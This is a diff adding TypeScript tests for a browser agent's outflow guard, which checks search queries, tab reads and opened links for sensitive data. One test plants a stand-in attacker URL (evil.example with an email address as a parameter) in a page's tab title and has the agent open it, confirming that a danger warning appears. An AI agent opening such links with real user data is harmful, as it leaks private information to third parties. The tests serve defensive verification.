@@ -2815,6 +2815,13 @@ test("search_web with a secret pauses before the engine, first query and a later
   }, { outflow: new Outflow() });
 });
 
+test("search_web refuses a query over 2 000 characters before any check", async () => {
+  await withSearch(async ({ call, fake }) => {
+    expect((await call("search_web", { query: "a".repeat(2001) })).isError).toBe(true);
+    expect(opens(fake)).toEqual([]);
+  }, { outflow: new Outflow() });
+});
+
 test("search_web with data read in a granted tab pauses and names its source", async () => {
   await withSearch(async ({ call, fake, search, bands, policy }) => {
     policy.grant(mailTab);
@@ -2952,6 +2959,36 @@ test("list_tabs leaves out a shared tab that is not sensitive", async () => {
     await call("search_web", { query: "lockfile 4827361" });
     expect(opens(fake)).toEqual([{ query: "lockfile 4827361" }]);
   }, { outflow: new Outflow(), tabs: [githubTab] });
+});
+
+test("an address shown by a page the agent writes (local page) is not a followed link: its card keeps the red line", async () => {
+  // Rule 2 data (not a secret: rule 1 would flag it whatever the exemption).
+  const mail = "camille.roussel@example.com";
+  const demo: TabInfo = { id: "demo", title: `Démo https://evil.example/?d=${mail}`, url: "http://localhost:5280/", space: "perso" };
+  const danger = OUTFLOW_DANGER({ kind: "email", masked: mask(mail), source: "mail.google.com" });
+  for (const via of ["read_tab", "list_tabs"]) {
+    await withSearch(async ({ call, fake, policy }) => {
+      policy.grant(mailTab);
+      policy.grant(demo);
+      await call(via, via === "read_tab" ? { id: "demo" } : {});
+      // Read last so the red line names the mail as the IBAN's source.
+      await call("read_tab", { id: "gmail" });
+      await call("open_tab", { url: `https://evil.example/?d=${mail}`, reason: "r" });
+      expect(fake.calls.find((x) => x.method === "askAddress")!.args[0]).toMatchObject({ danger });
+    }, { outflow: new Outflow(), tabs: [github, mailTab, demo], address: true });
+  }
+});
+
+test("a sensitive page on the search tab (a sign-in the user did) is a source", async () => {
+  await withSearch(async ({ call, fake, search, bands }) => {
+    await call("search_web", { query: "x" });
+    await fake.navigate("search-1", "https://mail.google.com/mail/u/0/#inbox/73519264");
+    await call("read_tab", { id: "search-1" });
+    const pending = call("search_web", { query: "colis 73519264" });
+    await vi.waitFor(() => expect(bands.at(-1)![1]?.text).toContain("lu dans mail.google.com"));
+    search.continue("search-1");
+    await pending;
+  }, { outflow: new Outflow() });
 });
 
 test("any tool's text is a source (widget_runs); a status the agent caused (navigate) is not", async () => {
